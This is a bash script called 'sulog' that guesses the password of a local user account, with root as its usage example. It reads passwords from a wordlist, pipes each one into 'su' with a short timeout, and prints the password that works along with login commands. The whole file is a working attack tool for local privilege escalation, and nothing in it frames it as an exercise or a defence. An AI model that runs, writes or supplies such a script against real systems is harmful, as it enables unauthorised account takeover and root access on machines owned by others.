#!/bin/bash

# sulog - Optimized Su Password Bruteforce Script
# Usage: ./sulog <user> <password_file>

if [ $# -ne 2 ]; then
    echo "Usage: $0 <username> <password_file>"
    echo "Example: $0 root passwords.txt"
    exit 1
fi

USERNAME="$1"
PASSWORD_FILE="$2"

# Check if password file exists
if [ ! -f "$PASSWORD_FILE" ]; then
    echo "Error: Password file '$PASSWORD_FILE' not found!"
    exit 1
fi

echo "Starting optimized su bruteforce for user: $USERNAME"
echo "Using password file: $PASSWORD_FILE"
echo "----------------------------------------"

# Counter untuk tracking
count=0
total=$(wc -l < "$PASSWORD_FILE")

# Optimized password test function
test_password() {
    local pwd="$1"
    
    # Use printf directly - much faster than temp files
    if command -v timeout >/dev/null 2>&1; then
        # With timeout (1 second is enough)
        result=$(printf '%s\n' "$pwd" | timeout 1 su "$USERNAME" -c 'echo SUCCESS' 2>/dev/null)
    else
        # Without timeout
        result=$(printf '%s\n' "$pwd" | su "$USERNAME" -c 'echo SUCCESS' 2>/dev/null)
    fi
    
    if [ "$result" = "SUCCESS" ]; then
        return 0
    else
        return 1
    fi
}

# Read password file line by line
while IFS= read -r password || [ -n "$password" ]; do
    count=$((count + 1))
    
    # Skip empty lines and comments
    if [ -z "$password" ] || [[ "$password" =~ ^[[:space:]]*# ]]; then
        continue
    fi
    
    # Remove leading/trailing whitespace
    password=$(echo "$password" | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    
    # Skip if still empty after cleanup
    if [ -z "$password" ]; then
        continue
    fi
    
    printf "[$count/$total] Trying: '%s' ... " "$password"
    
    if test_password "$password"; then
        echo "SUCCESS!"
        echo "========================================"
        echo "🎉 Password found: '$password'"
        echo "========================================"
        echo "Login with:"
        echo "su $USERNAME"
        echo "(password: $password)"
        echo ""
        echo "Test it:"
        echo "echo '$password' | su $USERNAME -c 'whoami'"
        exit 0
    else
        echo "failed"
    fi
    
    # Show progress every 50 attempts
    if [ $((count % 50)) -eq 0 ]; then
        echo "--- Progress: $count/$total passwords tested ---"
    fi
    
done < "$PASSWORD_FILE"

echo "========================================"
echo "❌ Bruteforce completed. No valid password found."
echo "Tested $count passwords from $PASSWORD_FILE"
echo "========================================"

# Debug info
echo ""
echo "Debug info:"
echo "- Make sure user exists: id $USERNAME"
echo "- Test su manually: echo 'testpass' | su $USERNAME -c 'whoami'"
echo "- Check first few passwords in wordlist:"
head -5 "$PASSWORD_FILE" | nl
